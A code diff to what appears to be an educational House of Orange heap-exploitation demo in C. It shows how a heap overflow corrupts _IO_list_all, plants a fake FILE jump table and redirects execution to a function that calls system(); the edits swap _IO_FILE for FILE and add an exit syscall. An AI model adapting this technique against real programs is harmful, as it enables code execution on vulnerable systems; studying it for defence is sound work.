@@ -1,6 +1,9 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/syscall.h>
 
 /*
   The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
@@ -219,7 +222,7 @@ int main()
       fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
     */
 
-    _IO_FILE *fp = (_IO_FILE *) top;
+    FILE *fp = (FILE *) top;
 
 
     /*
@@ -239,15 +242,15 @@ int main()
 
     /*
       4) Finally set the jump table to controlled memory and place system there.
-      The jump table pointer is right after the _IO_FILE struct:
-      base_address+sizeof(_IO_FILE) = jump_table
+      The jump table pointer is right after the FILE struct:
+      base_address+sizeof(FILE) = jump_table
 
          4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
     */
 
     size_t *jump_table = &top[12]; // controlled memory
     jump_table[3] = (size_t) &winner;
-    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
+    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8
 
 
     /* Finally, trigger the whole chain by calling malloc */
@@ -264,5 +267,6 @@ int main()
 int winner(char *ptr)
 { 
     system(ptr);
+    syscall(SYS_exit, 0);
     return 0;
 }
